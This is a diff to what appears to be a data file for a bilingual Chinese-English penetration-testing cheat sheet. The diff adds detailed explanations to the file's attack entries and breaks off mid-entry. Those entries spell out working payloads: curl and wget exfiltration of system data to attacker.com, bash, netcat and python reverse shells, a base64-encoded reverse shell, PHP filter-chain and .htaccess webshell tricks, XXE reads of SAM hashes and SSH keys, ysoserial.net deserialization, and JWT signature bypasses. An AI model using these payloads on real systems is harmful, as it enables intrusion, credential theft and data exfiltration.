         command: '?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=php://temp',
             syntaxBreakdown: [
-              { part: '?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '?file=php://filter/', explanation: { zh: 'filter流协议入口', en: 'Filter wrapper prefix' }, type: 'parameter' },
+              { part: 'convert.iconv.UTF8.CSISO2022KR', explanation: { zh: 'iconv字符集转换过滤器：链式变换字节的关键环节(重复叠加)', en: 'Charset conversion filter (stacked)' }, type: 'parameter' },
+              { part: 'convert.base64-decode', explanation: { zh: '解码过滤器在链中制造可控字节偏移', en: 'Decode filter shifts bytes' }, type: 'parameter' },
+              { part: 'resource=php://temp', explanation: { zh: '资源指向临时流，产出链条生成的代码', en: 'Temp stream as generated resource' }, type: 'value' },
             ],
         description: { zh: '完整Filter链示例', en: 'completeFilterChainexample' }, 
         },
@@ -6972,7 +7055,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '使用不同编码过滤器组合\n绕过关键字检测',
             syntaxBreakdown: [
-              { part: '使用不同编码过滤器组合\n绕过关键字检测', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '使用不同编码过滤器组合', explanation: { zh: 'iconv/base64过滤器交替组合变换载荷', en: 'Combine iconv and base64 filters' }, type: 'technique' },
+              { part: '绕过关键字检测', explanation: { zh: '链式转换后关键字不再以明文出现', en: 'Keywords no longer appear in plaintext' }, type: 'technique' },
             ],
         description: { zh: '编码组合绕过', en: 'EncodingGroupsCombineBypass' }, 
         platform: 'all'
@@ -7020,7 +7104,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. HTTP外带', en: '3. HTTPOut-of-band' }, 
         command: '; curl http://attacker.com/?data=$(whoami)\n; wget http://attacker.com/?data=$(id)\n; curl -d @/etc/passwd http://attacker.com/\n& certutil -urlcache -f http://attacker.com/?data=%USERNAME%',
             syntaxBreakdown: [
-              { part: '; curl http://attacker.com/?data=$(whoami)\n; wget http://attacker.com/?data=$(i', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '; curl http://attacker.com/?data=$(whoami)', explanation: { zh: '命令拼接curl外带whoami执行结果', en: 'Curl exfiltrates whoami output' }, type: 'command' },
+              { part: '; wget http://attacker.com/?data=$(id)', explanation: { zh: 'wget变体外带id结果', en: 'Wget variant exfiltrates id' }, type: 'command' },
+              { part: 'curl -d @/etc/passwd', explanation: { zh: '以POST方式外带整份passwd文件', en: 'POST entire passwd file' }, type: 'command' },
+              { part: 'certutil -urlcache -f', explanation: { zh: 'Windows下用certutil发起请求', en: 'Windows certutil variant' }, type: 'command' },
+              { part: '%USERNAME%', explanation: { zh: 'Windows环境变量取当前用户名', en: 'Windows environment variable' }, type: 'variable' },
             ],
         description: { zh: 'HTTP外带数据', en: 'HTTPOut-of-bandData' }, 
         platform: 'all'
@@ -7029,7 +7117,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. ICMP外带', en: '4. ICMPOut-of-band' }, 
         command: '; ping -p $(echo "test" | xxd -p) attacker.com\n; tcpdump -i eth0 icmp\n在攻击者服务器监听ICMP包',
             syntaxBreakdown: [
-              { part: '; ping -p $(echo "test" | xxd -p) attacker.com\n; tcpdump -i eth0 icmp\n在攻击者服务器监', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'ping -p $(echo "test" | xxd -p)', explanation: { zh: 'ping载荷字段携带hex编码数据(仅部分系统支持-p)', en: 'Ping payload carries hex data' }, type: 'command' },
+              { part: 'tcpdump -i eth0 icmp', explanation: { zh: '攻击者服务器监听eth0的ICMP流量', en: 'Listen for ICMP on attacker side' }, type: 'command' },
             ],
         description: { zh: 'ICMP外带数据', en: 'ICMPOut-of-bandData' }, 
         platform: 'linux'
@@ -7038,7 +7127,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 反弹Shell', en: '5. Reverse Shell' }, 
         command: '; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"\n; nc -e /bin/bash attacker 4444\n; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"',
             syntaxBreakdown: [
-              { part: '; bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"\n; nc -e /bin/bash attacker 4', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'bash -i >& /dev/tcp/attacker/4444 0>&1', explanation: { zh: 'bash反弹shell到4444端口', en: 'Bash reverse shell to port 4444' }, type: 'value' },
+              { part: 'nc -e /bin/bash attacker 4444', explanation: { zh: 'nc的-e选项直接反弹bash', en: 'Netcat reverse shell' }, type: 'command' },
+              { part: 'python -c "import socket,subprocess,os;..."', explanation: { zh: 'python建立socket并把标准IO重定向到连接', en: 'Python socket reverse shell' }, type: 'command' },
+              { part: 'os.dup2(s.fileno(),0)', explanation: { zh: '将标准输入重定向到socket', en: 'Redirect stdin to socket' }, type: 'function' },
+              { part: 'subprocess.call([\'/bin/bash\',\'-i\'])', explanation: { zh: '启动交互式bash接管连接', en: 'Spawn interactive bash' }, type: 'function' },
             ],
         description: { zh: '反弹Shell', en: 'Reverse Shell' }, 
         },
@@ -7048,8 +7141,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash\n使用Base64编码绕过',
             syntaxBreakdown: [
-              { part: ';', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==" | base64 -d | bash\n使用Base64编码绕过', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzEyMzQgMD4mMQ==', explanation: { zh: 'Base64编码的bash反弹shell命令', en: 'Base64-encoded reverse shell' }, type: 'encoding' },
+              { part: 'base64 -d', explanation: { zh: '解码还原命令', en: 'Decode payload' }, type: 'command' },
+              { part: '| bash', explanation: { zh: '管道交给bash执行', en: 'Pipe into bash' }, type: 'command' },
+              { part: '使用Base64编码绕过', explanation: { zh: '编码规避命令关键字检测', en: 'Encoding evades keyword detection' }, type: 'technique' },
             ],
         description: { zh: 'Base64编码绕过', en: 'Base64 EncodingBypass' }, 
         platform: 'linux'
@@ -7104,7 +7199,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. .NET反序列化', en: '4. .NETDeserialization' }, 
         command: '# 使用ysoserial.net\nysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"\n\n# 常见格式\nBinaryFormatter\nJson.NET\nXMLSerializer',
             syntaxBreakdown: [
-              { part: '# 使用ysoserial.net\nysoserial.net -g ObjectDataProvider -f Json.Net -c "calc.exe"', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'ysoserial.net', explanation: { zh: '.NET反序列化payload生成工具', en: '.NET deserialization payload generator' }, type: 'command' },
+              { part: '-g ObjectDataProvider', explanation: { zh: '指定gadget利用链', en: 'Specify gadget chain' }, type: 'parameter' },
+              { part: '-f Json.Net', explanation: { zh: '指定目标序列化格式化器', en: 'Specify target formatter' }, type: 'parameter' },
+              { part: '-c "calc.exe"', explanation: { zh: '要执行的命令(弹计算器验证)', en: 'Command to execute (calc for POC)' }, type: 'parameter' },
+              { part: 'BinaryFormatter', explanation: { zh: '常见可利用格式化器之一', en: 'Exploitable formatter' }, type: 'concept' },
+              { part: 'XMLSerializer', explanation: { zh: '常见可利用格式化器之一', en: 'Exploitable formatter' }, type: 'concept' },
             ],
         description: { zh: '.NET反序列化', en: '.NETDeserialization' }, 
         platform: 'windows'
@@ -7115,7 +7215,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '签名绕过', en: 'SignatureBypass' }, 
         command: '如果存在签名验证\n需要获取密钥重新签名',
             syntaxBreakdown: [
-              { part: '如果存在签名验证\n需要获取密钥重新签名', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '如果存在签名验证', explanation: { zh: '前提判断：序列化数据是否带签名保护', en: 'Check if payload is signed' }, type: 'concept' },
+              { part: '需要获取密钥重新签名', explanation: { zh: '利用前提：先窃取签名密钥才能伪造数据', en: 'Obtain signing key first' }, type: 'concept' },
             ],
         description: { zh: '绕过签名验证', en: 'BypassSignatureVerify' }, 
         platform: 'all'
@@ -7443,7 +7544,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '?file=%2fvar%2flog%2fapache2%2faccess.log\nURL编码路径',
             syntaxBreakdown: [
-              { part: '?file=%2fvar%2flog%2fapache2%2faccess.log\nURL编码路径', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '%2fvar%2flog%2fapache2%2faccess.log', explanation: { zh: 'Apache访问日志路径的URL编码形式(%2f为/)', en: 'URL-encoded access log path' }, type: 'encoding' },
+              { part: 'URL编码路径', explanation: { zh: '编码绕过路径关键字黑名单后包含日志投毒', en: 'Bypass path blacklist via encoding' }, type: 'technique' },
             ],
         description: { zh: 'URL编码绕过', en: 'URL EncodingBypass' }, 
         platform: 'all'
@@ -7598,8 +7700,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 自动包含', en: '2. Automaticcontains' }, 
         command: '# 自动在每个文件前包含\nphp_value auto_prepend_file /var/www/html/shell.php\n\n# 自动在每个文件后包含\nphp_value auto_append_file /var/www/html/shell.php',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 自动在每个文件前包含\nphp_value auto_prepend_file /var/www/html/shell.php\n\n# 自动在每个文件后包含\nphp_value auto_append_file /var/www/html/shell.php', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'php_value auto_prepend_file /var/www/html/shell.php', explanation: { zh: '每个PHP文件执行前自动包含shell', en: 'Auto-include shell before every PHP file' }, type: 'parameter' },
+              { part: 'php_value auto_append_file /var/www/html/shell.php', explanation: { zh: '每个PHP文件执行后自动包含shell', en: 'Auto-include shell after every PHP file' }, type: 'parameter' },
             ],
         description: { zh: '自动包含文件', en: 'AutomaticcontainsFile' }, 
         platform: 'linux'
@@ -7608,8 +7710,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 伪静态RCE', en: '3. Pseudo-static RCE' }, 
         command: '# 利用mod_rewrite\nRewriteEngine on\nRewriteRule ^(.*)$ $1 [L]\n\n# 更危险的配置\nSetHandler application/x-httpd-php',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 利用mod_rewrite\nRewriteEngine on\nRewriteRule ^(.*)$ $1 [L]\n\n# 更危险的配置\nSetHandler application/x-httpd-php', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'RewriteEngine on', explanation: { zh: '开启Apache重写引擎', en: 'Enable rewrite engine' }, type: 'command' },
+              { part: 'RewriteRule ^(.*)$ $1 [L]', explanation: { zh: '透传式规则(为后续利用铺垫)', en: 'Pass-through rewrite rule' }, type: 'command' },
+              { part: 'SetHandler application/x-httpd-php', explanation: { zh: '所有文件按PHP解析：上传任意文件即得RCE', en: 'Parse all files as PHP for RCE' }, type: 'parameter' },
             ],
         description: { zh: '伪静态配置', en: 'Pseudo-static configuration' }, 
         platform: 'linux'
@@ -7618,8 +7721,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 错误页面包含', en: '4. ErrorPagecontains' }, 
         command: '# 自定义错误页面\nErrorDocument 404 /shell.php\nErrorDocument 500 /shell.php',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 自定义错误页面\nErrorDocument 404 /shell.php\nErrorDocument 500 /shell.php', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'ErrorDocument 404 /shell.php', explanation: { zh: '404错误页指向webshell：访问不存在路径即触发', en: '404 page points to webshell' }, type: 'parameter' },
+              { part: 'ErrorDocument 500 /shell.php', explanation: { zh: '500错误页指向webshell变体', en: '500 page points to webshell' }, type: 'parameter' },
             ],
         description: { zh: '错误页面利用', en: 'ErrorPageExploitation' }, 
         platform: 'linux'
@@ -7628,7 +7731,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '5. 文件包含绕过', en: '5. File InclusionBypass' }, 
         command: '# 设置include路径\nphp_value include_path "/var/www/html/uploads"\n\n# 禁用安全限制\nphp_flag safe_mode off\nphp_flag display_errors on',
             syntaxBreakdown: [
-              { part: '# 设置include路径\nphp_value include_path "/var/www/html/uploads"\n\n# 禁用安全限制\nphp_f', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'php_value include_path "/var/www/html/uploads"', explanation: { zh: '改写包含搜索路径到上传目录', en: 'Rewrite include path to uploads' }, type: 'parameter' },
+              { part: 'php_flag safe_mode off', explanation: { zh: '关闭安全模式(PHP 5.3前有效)', en: 'Disable safe mode (legacy PHP)' }, type: 'parameter' },
+              { part: 'php_flag display_errors on', explanation: { zh: '开启错误回显辅助信息收集', en: 'Enable error display' }, type: 'parameter' },
             ],
         description: { zh: 'PHP配置修改', en: 'PHPConfigurationModify' }, 
         platform: 'linux'
@@ -7639,7 +7744,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '换行绕过', en: 'Newline bypass' }, 
         command: '使用换行符分隔配置\n绕过单行检测',
             syntaxBreakdown: [
-              { part: '使用换行符分隔配置\n绕过单行检测', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' },
+              { part: '使用换行符分隔配置', explanation: { zh: '多行书写.htaccess指令', en: 'Split directives across lines' }, type: 'technique' },
+              { part: '绕过单行检测', explanation: { zh: '规避按行匹配的黑名单', en: 'Evade line-based detection' }, type: 'technique' },
             ],
         description: { zh: '换行绕过', en: 'Newline bypass' }, 
         platform: 'linux'
@@ -7703,7 +7809,8 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '使用UTF-16编码XML文档\n绕过WAF检测',
             syntaxBreakdown: [
-              { part: '使用UTF-16编码XML文档\n绕过WAF检测', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '使用UTF-16编码XML文档', explanation: { zh: '将XML整体转为UTF-16编码', en: 'Encode XML document as UTF-16' }, type: 'technique' },
+              { part: '绕过WAF检测', explanation: { zh: 'WAF按单字节匹配特征时失效', en: 'Bypass byte-oriented WAF matching' }, type: 'technique' },
             ],
         description: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         platform: 'all'
@@ -7902,9 +8009,11 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '2. 读取Windows文件', en: '2. ReadWindowsFile' }, 
         command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">\n]>\n<foo>&xxe;</foo>\n\n# 其他敏感文件\nfile:///c:/windows/system32/config/sam\nfile:///c:/users/administrator/.ssh/id_rsa',
             syntaxBreakdown: [
-              { part: '<?xml version="1.0"?>', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '\n]>\n<foo>&xxe;</foo>\n\n# 其他敏感文件\nfile:///c:/windows/syste', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' }
+              { part: '<?xml version="1.0"?>', explanation: { zh: 'XML声明', en: 'XML declaration' }, type: 'tag' },
+              { part: '<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">', explanation: { zh: '外部实体指向win.ini实现任意文件读取', en: 'External entity reads win.ini' }, type: 'tag' },
+              { part: '<foo>&xxe;</foo>', explanation: { zh: '文档中引用实体触发加载', en: 'Entity reference triggers read' }, type: 'value' },
+              { part: 'file:///c:/windows/system32/config/sam', explanation: { zh: '其他目标：SAM账户数据库', en: 'Other target: SAM database' }, type: 'path' },
+              { part: 'file:///c:/users/administrator/.ssh/id_rsa', explanation: { zh: '其他目标：管理员SSH私钥', en: 'Other target: admin SSH key' }, type: 'path' },
             ],
         description: { zh: '读取Windows系统文件', en: 'ReadWindowsSystemFile' }, 
         platform: 'windows'
@@ -7913,9 +8022,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '3. 读取Web配置', en: '3. ReadWebConfiguration' }, 
         command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">\n]>\n<foo>&xxe;</foo>\n\n# 常见配置文件\nfile:///var/www/html/wp-config.php\nfile:///app/.env\nfile:///app/config/database.yml',
             syntaxBreakdown: [
-              { part: '<?xml version="1.0"?>', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '\n]>\n<foo>&xxe;</foo>\n\n# 常见配置文件\nfile:///var/www/html/wp-', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' }
+              { part: '<!ENTITY xxe SYSTEM "file:///var/www/html/config.php"', explanation: { zh: '外部实体指向PHP配置文件', en: 'Entity reads PHP config' }, type: 'tag' },
+              { part: 'file:///var/www/html/wp-config.php', explanation: { zh: 'WordPress配置：含数据库凭据', en: 'WordPress config' }, type: 'path' },
+              { part: 'file:///app/.env', explanation: { zh: '环境变量文件', en: 'Env file' }, type: 'path' },
+              { part: 'file:///app/config/database.yml', explanation: { zh: '数据库连接配置', en: 'Database config' }, type: 'path' },
             ],
         description: { zh: '读取Web应用配置', en: 'ReadWebApplicationConfiguration' }, 
         platform: 'all'
@@ -7924,9 +8034,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '4. 读取源代码', en: '4. ReadSourceCode' }, 
         command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">\n]>\n<foo>&xxe;</foo>',
             syntaxBreakdown: [
-              { part: '<?xml version="1.0"?>', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resourc', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '\n]>\n<foo>&xxe;</foo>', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' }
+              { part: '<?xml version="1.0"?>', explanation: { zh: 'XML声明', en: 'XML declaration' }, type: 'tag' },
+              { part: 'php://filter/convert.base64-encode', explanation: { zh: 'filter链Base64编码包装：防止PHP文件被执行', en: 'Base64 filter prevents execution' }, type: 'parameter' },
+              { part: 'resource=/var/www/html/index.php', explanation: { zh: '被读取的源码文件', en: 'Source file being read' }, type: 'value' },
+              { part: '<foo>&xxe;</foo>', explanation: { zh: '引用实体触发读取，响应返回Base64源码', en: 'Entity reference returns encoded source' }, type: 'value' },
             ],
         description: { zh: '使用PHP Filter读取源码', en: 'UsePHP FilterReadSourceCode' }, 
         },
@@ -7936,10 +8047,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '使用参数实体', en: 'UseParameterEntity' }, 
         command: '<?xml version="1.0"?>\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">\n<!ENTITY bar "%xxe;">\n]>\n<foo>&bar;</foo>',
             syntaxBreakdown: [
-              { part: '<?xml version="1.0"?>', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM "file:///etc/passwd">', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '<!ENTITY bar "%xxe;">', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '\n]>\n<foo>&bar;</foo>', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' }
+              { part: '<!ENTITY % xxe SYSTEM "file:///etc/passwd">', explanation: { zh: '参数实体指向passwd(%声明参数实体)', en: 'Parameter entity reads passwd' }, type: 'tag' },
+              { part: '<!ENTITY bar "%xxe;">', explanation: { zh: '普通实体引用参数实体的值', en: 'General entity references parameter entity' }, type: 'tag' },
+              { part: '<foo>&bar;</foo>', explanation: { zh: '文档中引用普通实体完成回显', en: 'Reference triggers the chain' }, type: 'value' },
             ],
         description: { zh: '参数实体绕过', en: 'ParameterEntityBypass' }, 
         platform: 'all'
@@ -8407,7 +8517,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'API版本绕过', en: 'APIVersionBypass' }, 
         command: '# 尝试不同API版本\n/api/v1/users  # 可能已修复\n/api/v2/users  # 可能未修复\n/api/users     # 旧版本可能无保护\n\n# 尝试内部API\n/internal/api/users\n/private/api/users\n/_api/users',
             syntaxBreakdown: [
-              { part: '# 尝试不同API版本\n/api/v1/users  # 可能已修复\n/api/v2/users  # 可能未修复\n/api/users     # 旧版', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: '/api/v1/users', explanation: { zh: 'v1版本：可能已修复漏洞', en: 'v1 endpoint possibly patched' }, type: 'path' },
+              { part: '/api/v2/users', explanation: { zh: 'v2版本：可能未同步修复', en: 'v2 endpoint possibly unpatched' }, type: 'path' },
+              { part: '/api/users', explanation: { zh: '无版本号路径：旧实现可能无保护', en: 'Versionless legacy endpoint' }, type: 'path' },
+              { part: '/internal/api/users', explanation: { zh: '内部API路径', en: 'Internal API path' }, type: 'path' },
+              { part: '/private/api/users', explanation: { zh: '私有API路径', en: 'Private API path' }, type: 'path' },
+              { part: '/_api/users', explanation: { zh: '下划线前缀变体', en: 'Underscore-prefixed variant' }, type: 'path' },
             ],
         description: { zh: '使用不同API版本绕过', en: 'Use not SameAPIVersionBypass' }, 
         platform: 'all'
@@ -8416,7 +8531,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '# URL编码\ncurl http://target.com/api/users/%31  # /users/1\n\n# Unicode编码\ncurl http://target.com/api/users/%u0031\n\n# 双重URL编码\ncurl http://target.com/api/users/%2531',
             syntaxBreakdown: [
-              { part: '# URL编码\ncurl http://target.com/api/users/%31  # /users/1\n\n# Unicode编码\ncurl h', explanation: { zh: '攻击载荷', en: 'AttackPayload' }, type: 'value' }
+              { part: 'curl http://target.com/api/users/%31', explanation: { zh: '请求URL编码的ID(%31即1)绕过校验', en: 'URL-encoded resource ID' }, type: 'command' },
+              { part: '%u0031', explanation: { zh: 'Unicode编码的数字1变体', en: 'Unicode-encoded variant' }, type: 'encoding' },
+              { part: '%2531', explanation: { zh: '双重URL编码变体(%25→%)', en: 'Double-encoded variant' }, type: 'encoding' },
             ],
         description: { zh: '使用编码绕过', en: 'UseEncoding Bypass' }, 
         platform: 'all'
@@ -8485,8 +8602,12 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '算法混淆', en: 'AlgorithmObfuscation' }, 
         command: '# 尝试不同变体\n{"alg":"none"}\n{"alg":"None"}\n{"alg":"NONE"}\n{"alg":"nOnE"}\n{"alg":""}\n{"alg":null}\n\n# 移除alg字段\n{"typ":"JWT"}',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 尝试不同变体\n{"alg":"none"}\n{"alg":"None"}\n{"alg":"NONE"}\n{"alg":"nOnE"}\n{"alg":""}\n{"alg":null}\n\n# 移除alg字段\n{"typ":"JWT"}', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '{"alg":"none"}', explanation: { zh: '算法声明为none：空签名绕过', en: 'alg set to none' }, type: 'json' },
+              { part: '{"alg":"None"}', explanation: { zh: '大小写变体绕过严格字符串比较', en: 'Case variant bypasses strict compare' }, type: 'json' },
+              { part: '{"alg":"nOnE"}', explanation: { zh: '混合大小写变体', en: 'Mixed-case variant' }, type: 'json' },
+              { part: '{"alg":""}', explanation: { zh: '空算法字符串', en: 'Empty algorithm' }, type: 'json' },
+              { part: '{"alg":null}', explanation: { zh: 'null算法', en: 'Null algorithm' }, type: 'json' },
+              { part: '{"typ":"JWT"}', explanation: { zh: '移除alg字段仅保留typ', en: 'Remove alg entirely' }, type: 'json' },
             ],
         description: { zh: '尝试算法变体', en: 'AttemptAlgorithmVariant' }, 
         platform: 'all'
@@ -8495,8 +8616,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '签名绕过', en: 'SignatureBypass' }, 
         command: '# 空签名\nheader.payload.\n\n# 任意签名\nheader.payload.anysignature\n\n# 使用原始签名\n# 某些库会忽略签名验证',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 空签名\nheader.payload.\n\n# 任意签名\nheader.payload.anysignature\n\n# 使用原始签名\n# 某些库会忽略签名验证', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: 'header.payload.', explanation: { zh: '空签名：第三段留空', en: 'Empty signature segment' }, type: 'value' },
+              { part: 'header.payload.anysignature', explanation: { zh: '任意内容充当签名', en: 'Arbitrary signature' }, type: 'value' },
+              { part: '某些库会忽略签名验证', explanation: { zh: '缺陷库在alg=none时不校验签名', en: 'Flawed libraries skip verification' }, type: 'concept' },
             ],
         description: { zh: '签名绕过变体', en: 'SignatureBypassVariant' }, 
         platform: 'all'
@@ -8643,8 +8765,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '参数污染', en: 'ParameterPollution' }, 
         command: '# 参数污染\n/api/users?id=1&id=2\n/api/users?id=2&id=1\n\n# JSON注入\n{"id": 1, "id": 2}\n\n# 批量操作\n/api/users/batch?ids=1,2,3,4,5',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' 参数污染\n/api/users?id=1&id=2\n/api/users?id=2&id=1\n\n# JSON注入\n{"id": 1, "id": 2}\n\n# 批量操作\n/api/users/batch?ids=1,2,3,4,5', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '?id=1&id=2', explanation: { zh: 'HPP参数污染：重复参数取值歧义', en: 'HTTP parameter pollution' }, type: 'value' },
+              { part: '{"id": 1, "id": 2}', explanation: { zh: 'JSON重复键：不同解析器取值不同', en: 'Duplicate JSON keys' }, type: 'json' },
+              { part: '/api/users/batch?ids=1,2,3,4,5', explanation: { zh: '批量端点：一次请求遍历多个对象', en: 'Batch endpoint iterates objects' }, type: 'path' },
             ],
         description: { zh: '参数污染绕过', en: 'ParameterPollutionBypass' }, 
         platform: 'all'
@@ -8713,7 +8836,10 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: 'API Key轮换', en: 'API key rotation' }, 
         command: '# 使用多个API Key\napi_keys = ["key1", "key2", "key3", "key4"]\nfor i, key in enumerate(api_keys):\n    requests.get("http://target.com/api/test", headers={"X-API-Key": key})\n\n# 注册多个账户获取多个Token',
             syntaxBreakdown: [
